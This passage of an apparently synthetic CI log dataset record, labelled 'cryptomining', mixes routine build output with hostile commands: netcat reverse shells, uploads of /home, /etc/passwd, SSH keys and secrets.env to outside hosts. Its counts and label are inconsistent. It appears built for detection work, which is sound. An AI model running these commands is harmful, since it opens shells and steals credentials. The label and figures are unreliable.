          "Cache hit for key-5440",
          "\u2713 All checks passed",
          "[12:20:15] DEBUG: Connection pool: 18 active",
          "[12:20:15] DEBUG: Query executed in 54ms",
          "WARNING: prettier has known vulnerabilities",
          "WARNING: express has known vulnerabilities",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-10T12:33:27.534261",
        "finished_at": "2025-12-10T12:33:54.848955",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Completed.",
          "Minifying vendor.js",
          "nc -e /bin/sh 26.6.254.180 35857",
          "Done.",
          "Sending 403MB of data to startup.dev",
          "Step 2/18: Deploying",
          "Step 11/24: Installing dependencies",
          "[12:20:15] WARN: Deprecated API usage",
          "Verifying...",
          "WARNING: react has known vulnerabilities",
          "[12:20:15] INFO: Connecting to database",
          "Cache invalidated: node_modules",
          "[12:20:15] DEBUG: Memory usage: 740MB",
          "Minifying app.js",
          "Compiling components/app.ts...",
          "Cache hit for key-6336",
          "yarn add: Done in 3.17s",
          "Switched to branch 'hotfix/task-670'",
          "GET /api - 201 (73ms)",
          "Step 20/23: Deploying",
          "Environment: production",
          "Platform: linux-x64",
          "[12:20:15] DEBUG: Connection pool: 6 active",
          "npm install: resolved 1436 packages",
          "Connecting to acme.corp:443...",
          "nc -e /bin/sh 79.248.27.105 21733",
          "Pulling image: python:latest",
          "Artifact downloaded: 14MB",
          "Artifact downloaded: 46MB",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "Step 13/17: Deploying",
          "pip: Installing build dependencies...",
          "Compiling utils/service.java...",
          "[12:20:15] DEBUG: Memory usage: 749MB",
          "Cache saved successfully",
          "Using Python 3.10",
          "Image pulled successfully",
          "Time: 86.296s",
          "pip: Collecting axios",
          "Using Python 3.9",
          "Already up to date.",
          "Fetching submodules...",
          "[12:20:15] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "OK",
          "WARNING: lodash has known vulnerabilities",
          "TLS handshake completed",
          "Coverage: 98% statements, 80% branches",
          "Fetching submodules...",
          "Compiling src/service.java...",
          "Image pulled successfully",
          "Using Node.js 20.4.10",
          "Environment: test",
          "yarn add: Done in 14.89s",
          "Generating source maps...",
          "Minifying vendor.js",
          "Step 19/18: Linting",
          "Creating production build...",
          "  PASS: unit/test_cache_hit.spec.js",
          "Cache restored successfully (255MB)",
          "Using Node.js 16.3.10",
          "pip install: Successfully installed prettier-4.18",
          "Checking out main branch",
          "Cache invalidated: build",
          "Ready.",
          "Cache restored successfully (100MB)",
          "[12:20:15] WARN: Deprecated API usage",
          "Ready.",
          "Compiling lib/utils.go...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "Pushing to registry...",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "Environment: test",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Test Suites: 12 passed, 20 total",
          "[12:20:15] INFO: Request completed",
          "WARNING: react has known vulnerabilities",
          "[12:20:15] DEBUG: Connection pool: 6 active",
          "Creating production build...",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "[12:20:15] WARN: Deprecated API usage",
          "npm install: added 331 packages",
          "[12:20:15] INFO: Cache refreshed",
          "[12:20:15] DEBUG: Connection pool: 5 active",
          "Pushing to registry...",
          "Pushing to registry...",
          "NODE_ENV=production",
          "npm notice: package.json updated",
          "Step 10/22: Building",
          "Using Node.js 16.4.4",
          "  PASS: unit/test_db_connect.spec.js",
          "Optimizing 34 modules...",
          "Connection established",
          "[12:20:15] ERROR: Connection failed",
          "Exception: NullPointerException",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: lodash has known vulnerabilities",
          "FAILED: test_cache_hit",
          "Cache hit for key-4687",
          "Using Python 3.10",
          "[12:20:15] INFO: Cache refreshed",
          "npm notice: package.json updated",
          "Step 13/21: Running migrations",
          "Pushing to registry...",
          "HEAD is now at f685d2c",
          "Artifact downloaded: 1MB",
          "pip: Collecting jest",
          "Artifact uploaded: build.tar.gz (40MB)",
          "FAILED: test_user_create",
          "nc -e /bin/sh 11.38.237.221 27244",
          "Installing prettier@2.4.6",
          "Fetching submodules...",
          "nc -e /bin/sh 115.226.96.244 6793",
          "  PASS: unit/test_auth_login.spec.js",
          "Compiling utils/app.ts...",
          "Completed.",
          "Cache invalidated: build",
          "Image pulled successfully",
          "\u2713 Task completed in 4497ms",
          "pip: Installing build dependencies...",
          "Compiling components/app.ts...",
          "WARNING: react has known vulnerabilities",
          "Test Suites: 40 passed, 11 total",
          "Artifact uploaded: build.tar.gz (13MB)",
          "[12:20:15] DEBUG: Memory usage: 447MB",
          "Sending 21MB of data to cloud.services",
          "Compiling utils/app.ts...",
          "Connection established",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Checking out master branch",
          "Checking out main branch",
          "[12:20:15] DEBUG: Initializing service",
          "Step 4/23: Linting",
          "\u2713 package completed",
          "Connection established",
          "Using Python 3.11",
          "\u2717 build failed with exit code 33",
          "WARNING: prettier has known vulnerabilities",
          "[12:20:15] WARN: Deprecated API usage",
          "Checking out master branch",
          "pip: Collecting prettier",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 107.248.222.176 20661",
          "Snapshots: 13 passed, 11 total",
          "\u2713 All checks passed",
          "Creating production build...",
          "Pushing to registry...",
          "Compiling components/service.java...",
          "Done.",
          "nc -e /bin/sh 252.1.150.217 16615",
          "Step 18/22: Installing dependencies",
          "[12:20:15] WARN: Deprecated API usage",
          "Compiling components/app.ts...",
          "pip: Collecting axios",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Checking out develop branch",
          "Cache saved successfully",
          "[12:20:15] WARN: Deprecated API usage",
          "TLS handshake completed",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Artifact uploaded: dist.zip (85MB)",
          "Pulling image: node:latest",
          "Platform: linux-x64",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Loading...",
          "Layer 8/15: COPY command",
          "Snapshots: 29 passed, 37 total",
          "pip: Collecting webpack",
          "[12:20:15] DEBUG: Initializing service",
          "Building Docker image...",
          "pip install: Successfully installed react-4.12",
          "Connecting to example.com:443...",
          "Loading...",
          "Step 7/18: Deploying",
          "Using Node.js 17.7.6",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Time: 30.782s",
          "Fetching submodules...",
          "[12:20:15] DEBUG: Loading configuration",
          "Time: 80.53s",
          "npm notice: created a lockfile",
          "Minifying app.js",
          "[12:20:15] INFO: Starting build process",
          "WARNING: prettier has known vulnerabilities",
          "[12:20:15] INFO: Request completed",
          "Building Docker image...",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "Creating production build...",
          "Cache hit for key-2038",
          "npm notice: package.json updated",
          "Waiting...",
          "  PASS: test_api_health (170ms)",
          "WARNING: eslint has known vulnerabilities",
          "Step 7/15: Running migrations",
          "npm notice: package.json updated",
          "[12:20:15] INFO: Processing request",
          "[12:20:15] WARN: Deprecated API usage",
          "Coverage: 76% statements, 85% branches",
          "Test Suites: 44 passed, 48 total",
          "WARNING: react has known vulnerabilities",
          "[12:20:15] INFO: Request completed",
          "\u2713 Step 'checkout' succeeded",
          "[12:20:15] DEBUG: Memory usage: 1610MB",
          "Using Python 3.12",
          "Waiting...",
          "Connecting to acme.corp:443...",
          "Snapshots: 1 passed, 31 total",
          "Ran 19 tests in 58s",
          "=== Step restore_cache completed ==="
        ]
      }
    ],
    "label": "cryptomining"
  }
}